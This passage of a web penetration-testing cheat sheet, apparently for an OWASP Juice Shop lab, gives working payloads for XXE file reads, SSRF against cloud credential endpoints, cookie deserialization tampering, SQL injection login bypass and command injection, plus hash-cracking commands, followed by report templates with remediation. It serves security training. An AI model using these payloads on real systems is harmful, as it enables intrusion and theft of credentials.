3. To bypass the 100KB client-side limit, use Burp:
   - Intercept the upload POST request
   - Send to Repeater
   - The file content is in the body — the challenge accepts oversized PDFs
   
4. Alternatively, change the extension in the filename parameter:
   filename="malicious.pdf.bak"
   
5. Screenshot: successful upload response (204 No Content = success)
```

---

## 11. XXE — XML External Entity Injection

### What It Is
When an application parses XML input and the XML parser is configured to process external entities, an attacker can read local files, perform SSRF, or cause denial of service.

### Where to Look
- Any endpoint that accepts XML input
- SOAP web services
- File upload that accepts .xml, .docx, .xlsx, .svg
- REST APIs with `Content-Type: application/xml`

### Basic XXE Payload
```xml
<!-- Read /etc/passwd from the server -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- SSRF via XXE — make the server fetch an internal URL -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <data>&xxe;</data>
</root>
```

### How to Test in Burp
```
1. Find a request that sends XML (check Content-Type: application/xml)
2. Intercept in Burp → Send to Repeater
3. Replace the XML body with the XXE payload above
4. Click Send
5. Look for /etc/passwd content in the response
```

---

## 12. SSRF — Server-Side Request Forgery

### What It Is
The application fetches a URL on behalf of the user. By supplying an internal URL, an attacker can make the server request internal services that aren't publicly accessible.

### Where to Look
- URL fetch features ("import from URL", "fetch image from URL")
- Webhooks
- PDF generators that load external resources
- Any parameter containing a URL

### Payloads
```
# Cloud metadata endpoints (internal — only accessible from within the cloud):
http://169.254.169.254/latest/meta-data/          # AWS EC2 metadata
http://169.254.169.254/latest/meta-data/iam/       # AWS IAM credentials
http://metadata.google.internal/computeMetadata/v1/ # GCP metadata

# Internal service discovery:
http://localhost/admin
http://127.0.0.1:8080/
http://127.0.0.1:3306/     # MySQL
http://127.0.0.1:6379/     # Redis
http://10.0.0.1/           # Internal network
http://192.168.1.1/        # Router/gateway

# URL bypass techniques (if localhost is filtered):
http://0.0.0.0/
http://[::1]/              # IPv6 localhost
http://127.0.0.1.nip.io/  # DNS-based bypass
http://2130706433/         # Decimal IP for 127.0.0.1
```

---

## 13. Insecure Deserialization

### What It Is
The application deserialises data from an untrusted source without validation. Attackers can craft malicious serialised objects that execute code when deserialised.

### Where to Look
- Cookies with base64-encoded content (often serialised objects)
- Hidden form fields with complex encoded values
- API responses containing serialised data

### Quick Check
```bash
# Check if cookie looks like a serialised object:
# Java serialised objects start with: rO0AB (base64 of \xac\xed\x00\x05)
# PHP serialised objects look like: O:4:"User":1:{s:4:"name";s:5:"admin";}
# Python pickle: starts with \x80\x04

# Decode a base64 cookie:
echo "YOUR_COOKIE_VALUE" | base64 -d | xxd | head

# If it starts with ac ed 00 05 → Java serialised → use ysoserial
# If it looks like O:4:"... → PHP serialised → modify directly
```

### PHP Serialisation Manipulation
```php
# Original cookie (base64 decoded):
O:4:"User":1:{s:4:"role";s:4:"user";}

# Modified to escalate privilege:
O:4:"User":1:{s:4:"role";s:5:"admin";}

# Re-encode and send as cookie:
echo 'O:4:"User":1:{s:4:"role";s:5:"admin";}' | base64
```

---

## 14. Password Cracking (Offline)

### When to Use
After extracting password hashes via SQL injection or from an exposed file, crack them offline to recover plaintext passwords.

### Identify the Hash Type
```bash
# Look at the hash format:
5f4dcc3b5aa765d61d8327deb882cf99     → MD5 (32 chars, hex)
e10adc3949ba59abbe56e057f20f883e     → MD5
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  → SHA-1 (40 chars)
$2a$12$...                           → bcrypt (starts with $2a$ or $2b$)
$6$...                               → SHA-512 crypt (Linux /etc/shadow)
$1$...                               → MD5 crypt

# Use hash-identifier:
hash-identifier "PASTE_HASH_HERE"
```

### Crack with John the Ripper
```bash
# Basic crack with default wordlist
john --wordlist=/usr/share/dirb/wordlists/big.txt hashes.txt

# Specify hash format:
john --format=raw-md5 --wordlist=/usr/share/dirb/wordlists/big.txt hashes.txt
john --format=bcrypt --wordlist=/usr/share/dirb/wordlists/big.txt hashes.txt
john --format=sha512crypt --wordlist=/usr/share/dirb/wordlists/big.txt hashes.txt

# Show cracked passwords:
john --show hashes.txt

# How to create the hashes file:
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
# Format: username:hash (John handles both with and without username)
```

### Crack with Hashcat
```bash
# MD5 (mode 0)
hashcat -m 0 hashes.txt /usr/share/dirb/wordlists/big.txt

# SHA-1 (mode 100)
hashcat -m 100 hashes.txt /usr/share/dirb/wordlists/big.txt

# bcrypt (mode 3200)
hashcat -m 3200 hashes.txt /usr/share/dirb/wordlists/big.txt

# SHA-512 crypt (mode 1800)
hashcat -m 1800 hashes.txt /usr/share/dirb/wordlists/big.txt

# Show results:
hashcat -m 0 hashes.txt --show

# Common hash modes:
# 0    = MD5
# 100  = SHA-1
# 1400 = SHA-256
# 1700 = SHA-512
# 1800 = sha512crypt (Linux)
# 3200 = bcrypt
# 500  = md5crypt
```

### Online Hash Cracking (for MD5 / SHA-1)
```
If john/hashcat don't crack it from the wordlist, try:
https://crackstation.net   — paste hash, get result instantly
https://md5decrypt.net     — MD5 specific
https://hashes.com         — large database

Juice Shop hashes (MD5):
admin password hash cracks to: admin123
Other users' hashes will crack to their weak passwords
```

---

## 15. Report Templates — Ready to Fill

### Template — XSS

```
Finding ID: F-XX
Title: [Reflected/DOM/Stored] Cross-Site Scripting in [Location]
Target: http://TARGET:PORT/[path]
Vulnerability Type: Cross-Site Scripting (XSS) — [Reflected/DOM/Stored]

Description:
The [search field / comment box / profile field] reflects / stores unsanitised
user input into the page response. An attacker can inject JavaScript that
executes in the victim's browser, enabling session hijacking, phishing, or
unauthorised actions on behalf of the victim.

Evidence:
Payload used:
  <iframe src="javascript:alert(`xss`)">

Steps to reproduce:
  1. Navigate to [URL]
  2. Enter the payload into the [field name]
  3. [Submit / click / open the page]
  4. The JavaScript alert fires immediately.

Screenshot: [F-XX-xss.png] — Alert dialog visible with payload in [location].

CVSS 3.1:
  Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  Score: 6.1 — Medium

Remediation:
  - Encode all user-supplied input before rendering into HTML using
    the framework's built-in output encoding functions.
  - Implement a strict Content-Security-Policy header that disallows
    inline scripts and restricts script sources to trusted origins.
  - Apply HttpOnly and Secure flags to all session cookies.
  - Validate input server-side; reject any input containing HTML tags.
  - Re-test by submitting <script>alert(1)</script> and confirming
    the browser renders it as plain text.

References:
  - OWASP XSS Prevention Cheat Sheet
  - https://portswigger.net/web-security/cross-site-scripting
  - NVD CVSS 3.1 Calculator
```

---

### Template — SQL Injection (Auth Bypass)

```
Finding ID: F-XX
Title: SQL Injection Authentication Bypass in Login Form
Target: http://TARGET:PORT/#/login
Vulnerability Type: SQL Injection — Authentication Bypass

Description:
The login form constructs a SQL query by concatenating user-supplied input
without parameterisation. Injecting a tautology (' OR 1=1--) into the email
field causes the WHERE clause to always evaluate as true, bypassing the
password check and granting access to the first account in the database
(the administrator account).

Evidence:
Payload used (Email field):
  ' OR 1=1--
Password: (any value)

Steps to reproduce:
  1. Navigate to http://TARGET:PORT/#/login
  2. Enter ' OR 1=1-- in the email field
  3. Enter any value in the password field
  4. Click Log In — admin access granted immediately.

Screenshot: [F-XX-sqli.png] — Successful admin login with payload visible.

CVSS 3.1:
  Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  Score: 9.8 — Critical

Remediation:
  - Replace all string-concatenated SQL queries with parameterised queries
    or prepared statements (PDO, SQLAlchemy, JDBC PreparedStatement).
  - Apply input validation to reject inputs containing SQL metacharacters.
  - Implement account lockout after 5 failed login attempts.
  - Run the database user with least privilege — read-only where possible.
  - Enable a Web Application Firewall (WAF) to detect and block SQLi patterns.

References:
  - OWASP SQL Injection Prevention Cheat Sheet
  - https://portswigger.net/web-security/sql-injection
  - NVD CVSS 3.1 Calculator
```

---

### Template — IDOR

```
Finding ID: F-XX
Title: Insecure Direct Object Reference on [Endpoint]
Target: http://TARGET:PORT/api/[resource]/[id]
Vulnerability Type: Broken Access Control — IDOR

Description:
The [endpoint] accepts a numeric resource identifier as a URL parameter but
does not verify that the requesting user is authorised to access that resource.
By modifying the identifier, a low-privileged authenticated user can access
data belonging to other users.

Evidence:
Legitimate request (own resource):
  GET /api/basket/5
  Authorization: Bearer [your token]
  → 200 OK — returns own basket

Modified request (another user's resource):
  GET /api/basket/1
  Authorization: Bearer [your token]
  → 200 OK — returns admin user's basket (unauthorised access confirmed)

Screenshot: [F-XX-idor.png] — Burp Repeater showing /basket/1 response
with different user's data.

CVSS 3.1:
  Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  Score: 6.5 — Medium

Remediation:
  - Implement server-side authorisation checks on every resource access:
    verify that session.userId == resource.ownerId before returning data.
  - Replace sequential numeric IDs with non-guessable UUIDs.
  - Log and alert on access attempts where a user requests resources
    belonging to other accounts.
  - Apply the principle of least privilege — users should only receive
    endpoints relevant to their own data.

References:
  - OWASP Broken Access Control
  - https://portswigger.net/web-security/access-control/idor
  - NVD CVSS 3.1 Calculator
```

---

### Template — Sensitive Data Exposure

```
Finding ID: F-XX
Title: Sensitive [File/Information] Exposed via [Location]
Target: http://TARGET:PORT/[path]
Vulnerability Type: Sensitive Data Exposure

Description:
The application exposes [describe what: backup file / credentials / PII / API key]
at [URL/location] without any authentication requirement. This data was
accessible to any unauthenticated user who knows or discovers the path.

Evidence:
Discovered via:
  dirb http://TARGET:PORT /usr/share/dirb/wordlists/common.txt

Request:
  GET http://TARGET:PORT/[path]
  Response: 200 OK — [describe content]

Screenshot: [F-XX-exposure.png] — Browser showing the exposed file/data.

CVSS 3.1:
  Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  Score: 7.5 — High

Remediation:
  - Remove or restrict access to [the file] using server-level access controls.
  - Audit the web root for any files that should not be publicly accessible.
  - Implement a deny-all default for static file serving and whitelist only
    necessary file types and directories.
  - Enable access logging and alert on requests to sensitive file paths.

References:
  - OWASP Sensitive Data Exposure
  - OWASP Top 10 A02:2021
  - NVD CVSS 3.1 Calculator
```

---

### Template — Security Misconfiguration (Missing Headers)

```
Finding ID: F-XX
Title: Missing [Header Name] HTTP Security Header
Target: http://TARGET:PORT
Vulnerability Type: Security Misconfiguration

Description:
The application does not set the [X-Frame-Options / Content-Security-Policy /
Strict-Transport-Security] HTTP response header. The absence of this header
exposes the application to [clickjacking / XSS / HTTPS downgrade] attacks.

Evidence:
Request:
  curl -I http://TARGET:PORT

Response headers (partial):
  Server: Werkzeug/3.0.3
  Content-Type: text/html
  [Header name] is absent from all responses.

Screenshot: [F-XX-headers.png] — curl output showing absence of the header.

CVSS 3.1:
  Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N
  Score: 4.7 — Medium

Remediation:
  - Add the following header to all HTTP responses:
    [Header-Name]: [Recommended-Value]
  - Configure this at the web server or application framework level so it
    applies globally and does not need to be set per-route.
  - Verify using: curl -I http://TARGET after the fix.

References:
  - OWASP Secure Headers Project
  - https://securityheaders.com
  - NVD CVSS 3.1 Calculator
```

---

### Template — Command Injection

```
Finding ID: F-XX
Title: OS Command Injection in [Feature Name]
Target: http://TARGET:PORT/[path]
Vulnerability Type: Command Injection

Description:
The [ping tool / diagnostics feature / IP lookup field] passes user-supplied
input directly to a system shell command without sanitisation. By appending
shell metacharacters, an attacker can execute arbitrary OS commands on the
server with the privileges of the web application process.

Evidence:
Payload injected into [field name]:
  127.0.0.1; id

Response contained:
  uid=33(www-data) gid=33(www-data) groups=33(www-data)

This confirms Remote Code Execution (RCE) on the server.

Screenshot: [F-XX-cmdi.png] — Response showing uid= output from injected id command.

CVSS 3.1:
  Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  Score: 9.8 — Critical

Remediation:
  - Never pass user input to system shell commands. Replace shell calls with
    native language functions (e.g., Python subprocess with argument lists,
    not shell=True).
  - If shell execution is unavoidable, whitelist the exact set of allowed
    characters (e.g., digits and dots for IP addresses only) and reject
    everything else.
  - Run the web application process as a low-privilege system user.
  - Implement WAF rules to detect and block command injection patterns.

References:
  - OWASP Command Injection
  - https://portswigger.net/web-security/os-command-injection
  - NVD CVSS 3.1 Calculator
```

---

## CVSS 3.1 Quick Scoring Reference

| Vulnerability | Typical Score | Severity | Key Factors |
|---|---|---|---|
| Command Injection (pre-auth) | 9.8 | Critical | AV:N PR:N UI:N C:H I:H A:H |
| SQLi Auth Bypass | 9.8 | Critical | AV:N PR:N UI:N C:H I:H A:H |
| Stored XSS | 6.4 | Medium | UI:N (no victim click needed) |
| Reflected XSS | 6.1 | Medium | UI:R (victim must click link) |
| DOM XSS | 6.1 | Medium | UI:R S:C |
| IDOR (read only) | 6.5 | Medium | PR:L (needs login) |
| IDOR (read + write) | 8.1 | High | PR:L C:H I:H |
| Path Traversal | 7.5 | High | PR:N UI:N C:H |
| CSRF | 6.5 | Medium | UI:R PR:N |
| Missing Headers | 4.3–5.3 | Medium | Depends on header |
| Sensitive Data Exposure | 7.5 | High | PR:N UI:N C:H |
| File Upload (RCE) | 9.8 | Critical | PR:N UI:N C:H I:H A:H |
| Brute Force (no lockout) | 7.5 | High | PR:N AC:L |

---

*Document version: 1.0 — May 2026*
*Covers: XSS, SQLi, Broken Auth, IDOR, Sensitive Data Exposure, Misconfiguration,*
*Path Traversal, Command Injection, CSRF, File Upload, XXE, SSRF, Deserialization,*
*Password Cracking, and ready-to-fill report templates.*
